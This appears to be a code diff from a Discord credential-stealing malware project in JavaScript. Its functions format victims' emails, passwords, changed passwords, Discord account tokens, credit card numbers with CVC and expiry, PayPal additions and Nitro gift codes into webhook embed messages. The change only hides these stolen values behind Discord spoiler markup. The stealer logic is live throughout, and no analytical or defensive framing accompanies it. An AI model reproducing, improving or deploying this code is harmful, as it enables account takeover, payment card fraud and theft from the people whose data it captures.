@@ -661,7 +661,7 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '**Account Info**',
-            value: `Email: **${email}** - Password: **${password}**`,
+            value: `Email: ||**${email}**|| - Password: ||**${password}**||`,
             inline: false,
           },
           {
@@ -671,7 +671,7 @@ const login = async (email, password, token) => {
           },
           {
             name: '**Token**',
-            value: `\`${token}\``,
+            value: `||\`${token}\`||`,
             inline: false,
           },
         ],
@@ -703,7 +703,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         fields: [
           {
             name: '**Password Changed**',
-            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
+            value: `Email: ||**${json.email}**||\nOld Password: ||**${oldpassword}**||\nNew Password: ||**${newpassword}**||`,
             inline: true,
           },
           {
@@ -745,7 +745,7 @@ const emailChanged = async (email, password, token) => {
         fields: [
           {
             name: '**Email Changed**',
-            value: `New Email: **${email}**\nPassword: **${password}**`,
+            value: `New Email: ||**${email}**||\nPassword: ||**${password}**||`,
             inline: true,
           },
           {
@@ -755,7 +755,7 @@ const emailChanged = async (email, password, token) => {
           },
           {
             name: '**Token**',
-            value: `\`${token}\``,
+            value: `||\`${token}\`||`,
             inline: false,
           },
         ],
@@ -797,7 +797,7 @@ const PaypalAdded = async (token) => {
           },
           {
             name: '**Token**',
-            value: `\`${token}\``,
+            value: `||\`${token}\`||`,
             inline: false,
           },
         ],
@@ -829,7 +829,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         fields: [
           {
             name: '**Credit Card Added**',
-            value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
+            value: `Credit Card Number: ||**${number}**||\nCVC: ||**${cvc}**||\nCredit Card Expiration: ||**${expir_month}/${expir_year}**||`,
             inline: true,
           },
           {
@@ -839,7 +839,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           },
           {
             name: '**Token**',
-            value: `\`${token}\``,
+            value: `||\`${token}\`||`,
             inline: false,
           },
         ],
@@ -873,7 +873,7 @@ const nitroBought = async (token) => {
         fields: [
           {
             name: '**Nitro bought!**',
-            value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
+            value: `**Nitro Code:**\n\`\`\`diff\n+ ||**${code}**||\`\`\``,
             inline: true,
           },
           {
